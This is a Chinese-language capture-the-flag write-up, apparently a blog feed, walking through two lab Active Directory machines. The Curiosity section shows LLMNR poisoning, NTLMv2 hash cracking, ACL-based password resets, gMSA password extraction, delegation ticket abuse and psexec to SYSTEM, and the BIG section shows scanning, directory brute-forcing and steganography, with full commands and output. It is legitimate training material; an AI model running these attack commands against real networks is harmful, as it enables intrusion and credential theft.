/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 12/09/24 - Ronnie Flathers @ropnop

2024/12/09 19:28:26 &gt;  Using KDC(s):
2024/12/09 19:28:26 &gt;   dc.hackme.thl:88

2024/12/09 19:28:27 &gt;  [+] VALID USERNAME:       administrator@hackme.thl
2024/12/09 19:28:28 &gt;  [+] VALID USERNAME:       osama@hackme.thl
2024/12/09 19:28:29 &gt;  [+] VALID USERNAME:       jdoe@hackme.thl
2024/12/09 19:28:32 &gt;  [+] VALID USERNAME:       Administrator@hackme.thl
2024/12/09 19:28:42 &gt;  [+] VALID USERNAME:       yogesh@hackme.thl
2024/12/09 19:29:56 &gt;  [+] VALID USERNAME:       JDoe@hackme.thl
2024/12/09 19:32:25 &gt;  [+] VALID USERNAME:       appolonia@hackme.thl
2024/12/09 19:32:31 &gt;  [+] VALID USERNAME:       aaren@hackme.thl

<br>将这些用户的名字提取出来 <br>┌──(root㉿kali)-[/home/kali/thl/curiosity]
└─# cat kerbrute_users.txt|cut -d ' ' -f14|awk -F  '@hack' '{print $1}' &gt; valid_users.txt

┌──(root㉿kali)-[/home/kali/thl/curiosity]
└─# cat valid_users.txt
administrator
osama
jdoe
Administrator
yogesh
JDoe
appolonia
aaren

<br>使用这些用户进行smb爆破<br>
但是失败了<br><br>┌──(root㉿kali)-[~]
└─# responder -I eth0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0

  To support this project:
  Github -&gt; https://github.com/sponsors/lgandx
  Paypal  -&gt; https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[*] [LLMNR]  Poisoned answer sent to fe80::d4db:8c8a:d91a:fba7 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to 192.168.56.8 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to fe80::d4db:8c8a:d91a:fba7 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to 192.168.56.8 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to 192.168.56.8 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to fe80::d4db:8c8a:d91a:fba7 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to fe80::d4db:8c8a:d91a:fba7 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to 192.168.56.8 for name SQLserver
[SMB] NTLMv2-SSP Client   : fe80::d4db:8c8a:d91a:fba7
[SMB] NTLMv2-SSP Username : hackme\jdoe
[SMB] NTLMv2-SSP Hash     : jdoe::hackme:a80ce2dc6617f684:E158321071759A3992DD284245EE2CAE:010100000000000000D712DE744ADB015540EDBF22DC66B3000000000200080056005A004400370001001E00570049004E002D004D00350031004200300047004100480047004D00350004003400570049004E002D004D00350031004200300047004100480047004D0035002E0056005A00440037002E004C004F00430041004C000300140056005A00440037002E004C004F00430041004C000500140056005A00440037002E004C004F00430041004C000700080000D712DE744ADB010600040002000000080030003000000000000000000000000040000086022E48DD6F8D2AB918C5A1878B26B5CABA662847271EF44BE523D72A543E120A0010000000000000000000000000000000000009001C0063006900660073002F00530051004C00730065007200760065007200000000000000000000000000
[+] Exiting...

<br>爆破hash<br>hashcat -a 0 -m 5600 ntlmv2.txt /usr/share/wordlists/seclists/Passwords/seasons.txt

JDOE::hackme:a80ce2dc6617f684:e158321071759a3992dd284245ee2cae:010100000000000000d712de744adb015540edbf22dc66b3000000000200080056005a004400370001001e00570049004e002d004d00350031004200300047004100480047004d00350004003400570049004e002d004d00350031004200300047004100480047004d0035002e0056005a00440037002e004c004f00430041004c000300140056005a00440037002e004c004f00430041004c000500140056005a00440037002e004c004f00430041004c000700080000d712de744adb010600040002000000080030003000000000000000000000000040000086022e48dd6f8d2ab918c5a1878b26b5caba662847271ef44be523d72a543e120a0010000000000000000000000000000000000009001c0063006900660073002f00530051004c00730065007200760065007200000000000000000000000000:$pr1ng@

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: JDOE::hackme:a80ce2dc6617f684:e158321071759a3992dd2...000000
Time.Started.....: Mon Dec  9 20:12:40 2024 (0 secs)
Time.Estimated...: Mon Dec  9 20:12:40 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/seclists/Passwords/seasons.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1879.6 kH/s (0.85ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/5390 (75.99%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/5390 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $pr1ng -&gt; W1NT3R2021@
Hardware.Mon.#1..: Util: 15%

<br>成功获取密码 $pr1ng@<br><br>利用winrm连接上来-<br>┌──(root㉿kali)-[/home/kali/thl/curiosity]
└─# evil-winrm -i 192.168.56.8 -u JDOE -p '$pr1ng@'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jdoe\Documents&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

<br>看了一下权限 没有啥可以直接利用的<br><br><br>┌──(root㉿kali)-[/home/kali/thl/curiosity]
└─# netexec ldap 192.168.56.8 -u 'jdoe' -p '$pr1ng@'  --bloodhound --collection All --dns-server 192.168.56.8
SMB         192.168.56.8    445    DC               [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False)
LDAP        192.168.56.8    389    DC               [+] hackme.thl\jdoe:$pr1ng@
LDAP        192.168.56.8    389    DC               Resolved collection methods: dcom, container, group, trusts, session, acl, rdp, objectprops, psremote, localadmin
LDAP        192.168.56.8    389    DC               Done in 00M 11S
LDAP        192.168.56.8    389    DC               Compressing output into /root/.nxc/logs/DC_192.168.56.8_2024-12-10_023006_bloodhound.zip

<br><img alt="Pasted image 20241209212339" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209212339.png" referrerpolicy="no-referrer"><br>
<img alt="Pasted image 20241209212314" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209212314.png" referrerpolicy="no-referrer"><br>
可以发现 jdoe 用户是 IT ADMIN 组的成员，而该组的成功可以修改 DBA_ADM 用户的密码<br>
但是 dba_adm 用户并没有特别的权限。但根据名字大概可以推断出其具有数据库管理员的权限<br><br>使用 impacket-changepasswd 修改密码<br>┌──(root㉿kali)-[/home/kali/thl/curiosity]
└─# impacket-changepasswd hackme.thl/'dba_adm'@192.168.56.8 -newpass 'admin!@#45' -altuser 'jdoe' -altpass '$pr1ng@' -no-pass -reset
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Setting the password of hackme.thl\dba_adm as hackme.thl\jdoe
[*] Connecting to DCE/RPC as hackme.thl\jdoe
[*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.

<br>测试一下能不能winrm上去<br>┌──(root㉿kali)-[/home/kali/thl/curiosity]
└─# evil-winrm -i 192.168.56.8 -u dba_adm -p 'admin!@#45'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\dba_adm\Documents&gt;
<br>可以发现是存在数据库服务的<br>
<img alt="Pasted image 20241209213951" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209213951.png" referrerpolicy="no-referrer"><br>
获取一下数据库服务名称<br>*Evil-WinRM* PS C:\Users\dba_adm\Documents&gt; reg query "HKLM\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL
    SQLEXPRESS    REG_SZ    MSSQL15.SQLEXPRESS

<br>名称是 SQLEXPRESS 但完整名称是 DC\SQLEXPRESS<br><br>*Evil-WinRM* PS C:\Users\dba_adm\Documents&gt; sqlcmd -E -S 'DC\SQLEXPRESS' -Q 'select @@version;'

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 &lt;X64&gt; (Build 14393: ) (Hypervisor)


(1 rows affected)

*Evil-WinRM* PS C:\Users\dba_adm\Documents&gt; sqlcmd -E -S 'DC\SQLEXPRESS' -Q 'SELECT name FROM master.dbo.sysdatabases;'
name
--------------------------------------------------------------------------------------------------------------------------------
master
tempdb
model
msdb
CredentialsDB

(5 rows affected)


<br>里面发现五个数据库 其中有一个十分可能有价值的数据库 CredentialsDB<br>获取里面的内容<br>*Evil-WinRM* PS C:\Users\dba_adm\Documents&gt; sqlcmd -E -S DC\SQLEXPRESS -d CredentialsDB -Q "SELECT * FROM dbo.Credentials;"
ID          Username                                           Password
----------- -------------------------------------------------- ----------------------------------------------------------------------------------------------------
          1 sqlsvc                                             23012244084524e51305f015727b890b

(1 rows affected)

<br><br>23012244084524e51305f015727b890b:P@ssword1234!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 23012244084524e51305f015727b890b
Time.Started.....: Mon Dec 09 21:54:01 2024 (0 secs)
Time.Estimated...: Mon Dec 09 21:54:01 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   101.5 MH/s (1.83ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Speed.#2.........:        0 H/s (7.72ms) @ Accel:128 Loops:1 Thr:64 Vec:1
Speed.#*.........:   101.5 MH/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1572864/14344387 (10.97%)
Rejected.........: 0/1572864 (0.00%)
Restore.Point....: 0/14344387 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -&gt; lindarox
Candidates.#2....: lindarous -&gt; efesio
Hardware.Mon.#1..: Temp: 40c Util:  9% Core:1890MHz Mem:8000MHz Bus:8
Hardware.Mon.#2..: N/A

Started: Mon Dec 09 21:53:56 2024
Stopped: Mon Dec 09 21:54:03 2024
<br>爆破出来密码是 P@ssword1234!<br>winrm连接上去 sqlsvc P@ssword1234!<br>*Evil-WinRM* PS C:\Users\sqlsvc\Documents&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

<br><br><img alt="Pasted image 20241209220120" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209220120.png" referrerpolicy="no-referrer"><br>
<img alt="Pasted image 20241209220232" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209220232.png" referrerpolicy="no-referrer"><br>
可以发现 SQLSVC 用户是 GMSA_USERS 用户组的成员，而改组的成员可以获取 机器 GMSA_SVC$ 的密码<br>获取 GMSA_SVC$ 的密码<br>┌──(root㉿kali)-[~]
└─# nxc ldap 192.168.56.8 -u 'sqlsvc' -p 'P@ssword1234!' --gmsa
SMB         192.168.56.8    445    DC               [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False)
LDAPS       192.168.56.8    636    DC               [+] hackme.thl\sqlsvc:P@ssword1234!
LDAPS       192.168.56.8    636    DC               [*] Getting GMSA Passwords
LDAPS       192.168.56.8    636    DC               Account: GMSA_SVC$            NTLM: b7a596258a854cdcf1d44d42d877c3bb

<br><br><br><img alt="Pasted image 20241209220716" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209220716.png" referrerpolicy="no-referrer"><br>
可以看到我们当前机器对DC具有 AllowedToAct 权限。即约束性委派<br>
我们使用域账户 hackme.thl/GMSA_SVC$ 伪装为域管理员 administrator，并获取目标服务 cifs/dc.hackme.thl 的服务票据（TGS），然后通过服务票据滥用，实现对目标服务的访问权限
<br>┌──(root㉿kali)-[~]
└─# impacket-getST -spn cifs/dc.hackme.thl -impersonate administrator -dc-ip 192.168.56.8 'hackme.thl/GMSA_SVC$' -hashes ':b7a596258a854cdcf1d44d42d877c3bb' -no-pass
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

<br>
但是我们这里出错了，原因是时钟偏差过大（Clock skew too great）。该错误通常发生在 Kerberos 客户端与 KDC（Kerberos 认证中心）之间的时间差异超过了 Kerberos 协议的容忍范围。
<br>使用 rdate 同步域时间<br>┌──(root㉿kali)-[~]
└─# rdate -n 192.168.56.8
Tue Dec 10 05:17:34 CST 2024

┌──(root㉿kali)-[~]
└─# impacket-getST -spn cifs/dc.hackme.thl -impersonate administrator -dc-ip 192.168.56.8 'hackme.thl/GMSA_SVC$' -hashes ':b7a596258a854cdcf1d44d42d877c3bb' -no-pass
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc.hackme.thl@HACKME.THL.ccache

<br>这样我们就获取到服务器管理员的服务票据（TGS）了<br>将票据导入环境变量<br>export KRB5CCNAME=/root/administrator@cifs_dc.hackme.thl@HACKME.THL.ccache
<br>
注意 这里需要写票据的绝对路径
<br>然后利用 impacket-psexec 进行PTH<br>┌──(root㉿kali)-[~]
└─# impacket-psexec HACKME.THL/administrator@dc.hackme.thl -k -target-ip 192.168.56.8
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
[*] Requesting shares on 192.168.56.8.....
[*] Found writable share ADMIN$
[*] Uploading file WroTUHgi.exe
[*] Opening SVCManager on 192.168.56.8.....
[*] Creating service fwyV on 192.168.56.8.....
[*] Starting service fwyV.....
[!] Press help for extra shell commands                                                                                        Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt; whoami                                                                                                    nt authority\system


c:\Users&gt; type c:\users\Administrator\desktop\root.txt                                                                       24aff662fbb2ce2ecbf85daa79a396d9

c:\Users&gt; type jdoe\desktop\user.txt                                                                                           bd548d24899423996c68a1a2e1e6bad

]]></description><link>https://www.c1trus.top/24-渗透/thl/5.curiosity.html</link><guid isPermaLink="false">24-渗透/THL/5.curiosity.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209212339.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209212339.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[4.BIG]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 端口扫描" data-href="#2.1. 端口扫描" href="https://www.c1trus.top/about:blank#2.1._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 端口扫描</a>
<br><a data-tooltip-position="top" aria-label="2.2. SMb空会话检测" data-href="#2.2. SMb空会话检测" href="https://www.c1trus.top/about:blank#2.2._SMb空会话检测" class="internal-link" target="_self" rel="noopener nofollow">2.2. SMb空会话检测</a>
<br><a data-tooltip-position="top" aria-label="2.3. kerberute爆破" data-href="#2.3. kerberute爆破" href="https://www.c1trus.top/about:blank#2.3._kerberute爆破" class="internal-link" target="_self" rel="noopener nofollow">2.3. kerberute爆破</a>
<br><a data-tooltip-position="top" aria-label="2.4. 目录扫描" data-href="#2.4. 目录扫描" href="https://www.c1trus.top/about:blank#2.4._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">2.4. 目录扫描</a>


<br><a data-tooltip-position="top" aria-label="3. big图片解密" data-href="#3. big图片解密" href="https://www.c1trus.top/about:blank#3._big图片解密" class="internal-link" target="_self" rel="noopener nofollow">3. big图片解密</a>
<br><a data-tooltip-position="top" aria-label="4. 提权" data-href="#4. 提权" href="https://www.c1trus.top/about:blank#4._提权" class="internal-link" target="_self" rel="noopener nofollow">4. 提权</a>

<br><a data-tooltip-position="top" aria-label="4.1. 利用Bloodhound收集域内环境" data-href="#4.1. 利用Bloodhound收集域内环境" href="https://www.c1trus.top/about:blank#4.1._利用Bloodhound收集域内环境" class="internal-link" target="_self" rel="noopener nofollow">4.1. 利用Bloodhound收集域内环境</a>
<br><a data-tooltip-position="top" aria-label="4.2. AS-REPRoasting" data-href="#4.2. AS-REPRoasting" href="https://www.c1trus.top/about:blank#4.2._AS-REPRoasting" class="internal-link" target="_self" rel="noopener nofollow">4.2. AS-REPRoasting</a>


<br><a data-tooltip-position="top" aria-label="5. SAM转储" data-href="#5. SAM转储" href="https://www.c1trus.top/about:blank#5._SAM转储" class="internal-link" target="_self" rel="noopener nofollow">5. SAM转储</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://thehackerslabs.com/b-i-g/" target="_blank">https://thehackerslabs.com/b-i-g/</a><br>
难度 ⭐️⭐️⭐️⭐️️
<br><br><br>┌──(root㉿kali)-[/home/kali/thl/BIG]
└─# fscan -h 192.168.212.4

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _`' |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.212.4:445 open
192.168.212.4:139 open
192.168.212.4:80 open
192.168.212.4:88 open
192.168.212.4:135 open
[*] alive ports len is: 5
start vulscan
[*] NetBios 192.168.212.4   [+] DC:BBR\BIG
[*] NetInfo
[*]192.168.212.4
   [-&gt;]BIG
   [-&gt;]192.168.212.4
[*] WebTitle http://192.168.212.4      code:200 len:435    title:None
已完成 5/5
[*] 扫描结束,耗时: 1.939563155s

┌──(root㉿kali)-[/home/kali/thl/BIG]
└─# nmap -sCV 192.168.212.4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-05 16:00 CST
Nmap scan report for 192.168.212.4
Host is up (0.00026s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn''t have a title (text/html).
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-05 23:00:19Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bbr.thl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: bbr.thl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
MAC Address: 08:00:27:AD:59:C2 (Oracle VirtualBox virtual NIC)
Service Info: Host: BIG; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-12-05T23:00:19
|_  start_date: 2024-12-05T22:56:51
|_clock-skew: 14h59m57s
|_nbstat: NetBIOS name: BIG, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:ad:59:c2 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.95 seconds

<br>配一下域名<br>192.168.212.4  bbr.thl big.bbr.thl
<br>网站<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
└─# curl http://192.168.212.4
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;style&gt;
        /* It was all a dream */
        body {
            background-image: url('big1.jpg');
            background-size: cover;
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-position: center;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;

    &lt;h1&gt;Music&lt;/h1&gt;
    &lt;p&gt;I keep it music music, I eat that lunch (Yeah)&lt;/p&gt;

&lt;/body&gt;
&lt;/html&gt;

<br><br>┌──(root㉿kali)-[/home/kali/thl/BIG]
└─# smbmap -u anonymous -H 192.168.212.4

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 0 SMB session(s)

<br>不存在 smb空会话<br><br>尝试kerberute 爆破 <br>┌──(root㉿kali)-[/home/kali/thl/BIG]
└─# kerbrute userenum -d BBR.BIG.THL  --dc 192.168.212.4  /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 12/05/24 - Ronnie Flathers @ropnop

2024/12/05 16:34:26 &gt;  Using KDC(s):
2024/12/05 16:34:26 &gt;   192.168.212.4:88

2024/12/05 16:34:26 &gt;  [!] info@BBR.BIG.THL - KDC ERROR - Wrong Realm. Try adjusting the domain? Aborting...
2024/12/05 16:34:26 &gt;  [!] 2000@BBR.BIG.THL - KDC ERROR - Wrong Realm. Try adjusting the domain? Aborting...
2024/12/05 16:34:26 &gt;  [!] john@BBR.BIG.THL - KDC ERROR - Wrong Realm. Try adjusting the domain? Aborting...

2024/12/05 16:34:26 &gt;  Done! Tested 20 usernames (0 valid) in 0.002 seconds

<br>也不行，看来只能从网站入手了<br><br>┌──(root㉿kali)-[/home/kali/thl/BIG]
└─# gobuster dir -u http://192.168.212.4 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x jpg,php,html,png,zip,bak,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.212.4
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,php,html,png,zip,bak,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 151] [--&gt; http://192.168.212.4/images/]
/contents             (Status: 301) [Size: 153] [--&gt; http://192.168.212.4/contents/]
/songs                (Status: 301) [Size: 150] [--&gt; http://192.168.212.4/songs/]

<br>扫出来有三个目录<br>
我们优先看 contents 目录<br>对这个目录在扫描一下<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
└─# gobuster dir -u http://192.168.212.4/contents -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x jpg,php,html,png,zip,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.212.4/contents
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,php,html,png,zip,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/notify.txt           (Status: 200) [Size: 112]

<br>获取到一个文档<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
└─# curl http://192.168.212.4/contents//notify.txt
Who the hell did you hire to create the website!
Hiding keys in MD5 again!
I'm going to fire that guy

music                                                                                                                      
翻译：
“到底是谁给你们开发的网站！  
又用 MD5 隐藏密钥了！  
我要解雇那个家伙。”

“music”
<br>意思是有个秘钥被Md5加密了<br>
还得到一个用户 music<br>在扫描一下 songs 目录下的文件<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
└─# gobuster dir -u http://192.168.212.4/songs -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.212.4/songs
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/juicy.txt            (Status: 200) [Size: 3350]
Progress: 415286 / 415288 (100.00%)
===============================================================
Finished
===============================================================


<br>juicy.txt 是一个歌词文档 。没有什么东西<br><br>再看看另外的一个文件夹<br>
┌──(root㉿kali)-[/home/kali/thl/BIG]
└─# gobuster dir -u http://192.168.212.4/images -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -                                       x jpg,png
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.212.4/images
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              png,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/big4.jpg             (Status: 200) [Size: 196567]
Progress: 622929 / 622932 (100.00%)
===============================================================
Finished
===============================================================

<br>这有一个图片叫 big4.jpg 而且知道首页的图片是 big1.jpg<br>那我估计还有好几个big2、3、4、5、6之类的<br>
尝试都下下来<br>经过测试 一共有4张图片<br>
<img alt="big1" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/big1.jpg" referrerpolicy="no-referrer"><br>
<img alt="big2" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/big2.jpg" referrerpolicy="no-referrer"><br>
<img alt="big3" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/big3.jpg" referrerpolicy="no-referrer"><br>
<img alt="big4" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/big4.jpg" referrerpolicy="no-referrer"><br>
我内个大帅哥啊<br>这几张图片里面肯定是有东西的<br>
对图片进行检测是否存在隐藏内容<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
└─# stegseek --seed big2.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found (possible) seed: "c2726679"
        Plain size: 43.0 Byte(s) (compressed)
        Encryption Algorithm: rijndael-128
        Encryption Mode:      cbc

<br>对四个检测后发现 big2.jpg 存在隐写。但是需要密码才能解密<br>前面有提到密码是一个md5<br>
之前网站源码里面是有一段关键的话的 It was all a dream<br>
尝试对这个进行md5 然后使用md5运算后的值进行解密<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
└─# echo -n 'It was all a dream' |md5sum
